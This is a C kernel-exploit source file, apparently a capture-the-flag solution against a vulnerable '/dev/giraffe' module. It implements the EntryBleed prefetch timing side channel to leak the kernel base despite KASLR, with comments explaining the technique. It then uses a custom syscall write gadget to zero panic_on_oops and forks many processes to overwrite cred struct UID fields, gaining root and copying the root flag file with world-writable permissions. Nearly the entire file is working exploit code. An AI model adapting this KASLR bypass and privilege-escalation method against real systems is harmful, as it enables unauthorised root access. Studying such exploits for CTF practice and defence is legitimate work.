#include <stddef.h>
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/wait.h>

// commands
#define DEV_PATH "" // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4 * PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

#define WAIT getc(stdin);
#define ulong unsigned long

#define errExit(msg)                                                           \
    do {                                                                       \
        perror(msg);                                                           \
        exit(EXIT_FAILURE);                                                    \
    } while (0)
#define KMALLOC(qid, msgbuf, N)                                                \
    for (int ix = 0; ix != N; ++ix) {                                          \
        if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1)        \
            errExit("KMALLOC");                                                \
    }

static void print_hex8(char *buf, size_t len) {
    uint64_t *tmp = (uint64_t *)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

void error(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[x] ");
    vprintf(format, args);

    va_end(args);
}

struct pt_regs {
    ulong r15;
    ulong r14;
    ulong r13;
    ulong r12;
    ulong bp;
    ulong bx;
    ulong r11;
    ulong r10;
    ulong r9;
    ulong r8;
    ulong ax;
    ulong cx;
    ulong dx;
    ulong si;
    ulong di;
    ulong orig_ax;
    ulong ip;
    ulong cs;
    ulong flags;
    ulong sp;
    ulong ss;
};

static void print_regs(struct pt_regs *regs) {
    printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14,
           regs->r13, regs->r12);
    printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11,
           regs->r10);
    printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax,
           regs->cx);
    printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di,
           regs->ip);
    printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags,
           regs->sp, regs->ss);
}

int64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;");
}

int open_dev(void) {
    int fd = open("/dev/giraffe", O_RDWR);
    if (fd < 0) {
        errExit("open");
    }

    return fd;
}


/*
Entrybleed attack:
- prefetch = load byte from memory to location in cache hierachy
prefetch will finish quickly if address being loaded is already in TLB and finish
slower if it isn't (due to page table walk having to be done)
- KPTI = Kernel page table isolation. Kernel has all of userspace virtual memory
mapped. Userspace only minimal amount of kernel virtual memory, like exception/syscall
entry handlers and anything else necessary for the user to kernel transition.

Entrybleed issue: `entry_SYSCALL_64` symbol which is at a constant offset of KASLR,
is loaded into a LSTAR MST register inside `syscall_init` function, which gets executed
**before** switching to kernel. Therefore it is mapped in userspace and loaded into
TLB.

Why is TLB not invalidated when switching to kernel ? Because `global` bit is
set on PTE
    - global bit: tells the processor not to invalidate the TLB entry corresponding to the page upon a MOV to CR3 instruction.
    - global bit disabled for all pages except the ones being mapped in both user and kernel space:
        "global pages are disabled for all kernel structures not mapped into both kernel and userspace page tables"

Overall idea: repeatedly execute syscalls to ensure that the page with entry_SYSCALL_64
    (hence the name EntryBleed) gets cached in the instruction TLB, and then prefetch side-channel
    the possible range of addresses for that handler (as the kernel itself is guaranteed to be within 0xffffffff80000000 - 0xffffffffc0000000).


*/
uint64_t sidechannel(uint64_t addr) {
  uint64_t a, b, c, d;
  asm volatile (".intel_syntax noprefix;"
    "mfence;"
    "rdtscp;"
    "mov %0, rax;"
    "mov %1, rdx;"
    "xor rax, rax;"
    "lfence;"
    "prefetchnta qword ptr [%4];"
    "prefetcht2 qword ptr [%4];"
    "xor rax, rax;"
    "lfence;"
    "rdtscp;"
    "mov %2, rax;"
    "mov %3, rdx;"
    "mfence;"
    ".att_syntax;"
    : "=r" (a), "=r" (b), "=r" (c), "=r" (d)
    : "r" (addr)
    : "rax", "rbx", "rcx", "rdx");
  a = (b << 32) | a;
  c = (d << 32) | c;
  return c - a;
}

#define KERNEL_LOWER_BOUND 0xffffffff80000000ull
#define KERNEL_UPPER_BOUND 0xffffffffc0000000ull

#define PHYSMAP_BOTTOM 0xffff888000000000ull
#define PHYSMAP_TOP 0xffffc88000000000ull

// step size probably based on kernel alignment such that 0x1000 wouldnt make sense
#define STEP 0x100000ull

#define DUMMY_ITERATIONS 5
#define ITERATIONS 100
#define ARR_SIZE (SCAN_END - SCAN_START) / STEP

uint64_t prefetch_leak(uint64_t start, uint64_t end, uint64_t step)
{
    uint64_t size = (end - start) / step;
    uint64_t *data = calloc(size, sizeof(uint64_t));
    uint64_t min = ~0, addr = ~0;

    for (int i = 0; i < ITERATIONS + DUMMY_ITERATIONS; i++)
    {
        for (uint64_t idx = 0; idx < size; idx++)
        {
            uint64_t test = start + idx * step;
            syscall(104);
            uint64_t time = sidechannel(test);
            if (i >= DUMMY_ITERATIONS)
                data[idx] += time;
        }
    }

    for (int i = 0; i < size; i++)
    {
        data[i] /= ITERATIONS;
        if (data[i] < min)
        {
            min = data[i];
            addr = start + i * step;
        }
    }

    return addr;
}

void corcrash(uint64_t addr, uint64_t val) {
    syscall(470, addr, val);
}

static const char* g_socket_path = "socket";
static const char *const g_root = "root::0:0:root:/root:/bin/sh\n";

void flag_worker(void) {
    while (1) {
        sleep(1);
        if (getuid() != 0) {
            continue;
        }

        system("cp /root/flag.txt /home/ctf/ && chmod 777 /home/ctf/flag.txt");
        break;
    }
}

// REP STOSB      Write AL to [RDI] a total of ECX times.
// got control over rsi and rdi (same value though)

uint64_t ret = 0xffffffff81000749 - 0xffffffff81000000;
uint64_t panic_on_ops = 0xffffffff82757d04 - 0xffffffff81000000;

// 0xffffffff818e56fe : mov qword ptr [rdi + 0x30], rdx ; jmp 0xffffffff81acca70
uint64_t mov_qword_ptr_rdi_0x30 = 0xffffffff818e56fe - 0xffffffff81000000;

// break *0xffffffffc0000104
int main(int argc, char**argv) {
    uint64_t kbase = prefetch_leak(KERNEL_LOWER_BOUND, KERNEL_UPPER_BOUND, STEP);
    uint64_t init_cred = kbase + 0x10611a0 ;
    uint64_t cur_task = kbase + 0x171f018;

    info("Leak: %p \n", kbase);
    info("Gadget: %p \n", kbase+mov_qword_ptr_rdi_0x30);
    info("Panic on ops: %p \n", kbase+panic_on_ops);

    if (argc == 1) {
        // overwrite panic_on_ops with 0 such that kernel doesn't shut down when
        // an oops error occurs
        //
        // -0x30 because gadget does + 0x30
        corcrash(kbase+mov_qword_ptr_rdi_0x30 , kbase+panic_on_ops-0x30);
    }
    else {
        char* end = NULL;
        uint64_t heap_addr = strtoull(argv[1], &end, 0x10) & 0xfffffffff0000000;
        info("Heap addr: %p \n", heap_addr);

        uint64_t cred_struct = heap_addr+0x189d000;
        info("Cred struct?: %p \n", cred_struct);
        unsigned proc_cnt = 0x8;
        for (unsigned i = 0; i < proc_cnt; ++i) {
            int pid = fork();
            if (pid == 0) {
                // spray cred structs and try to access flag
                flag_worker();
                exit(0);
            }
        }

        if (fork() == 0) {
            for (int i = 0; i < 0x1; ++i) {
                // 21 structs per page (192)
                for (int j = 0; j < 21; ++j) {
                    // overwrite all UID related members with 0
                    for (int k = 1; k < 5; ++k) {
                        if (fork() == 0) {
                            corcrash(kbase+mov_qword_ptr_rdi_0x30 , cred_struct-0x30+ 192*j +k*8);
                            exit(0);
                        }
                    }
                }
                cred_struct+=0x1000;
            }
        }

        info("Spray done, check\n");
        WAIT
        exit(0);
        //corcrash(kbase+mov_qword_ptr_rdi_0x30 , cred_struct-0x30+0x18+192);
        //info("Spray done, check\n");
        //WAIT

    }
}


// physmap leak + Stack Pivot + KROP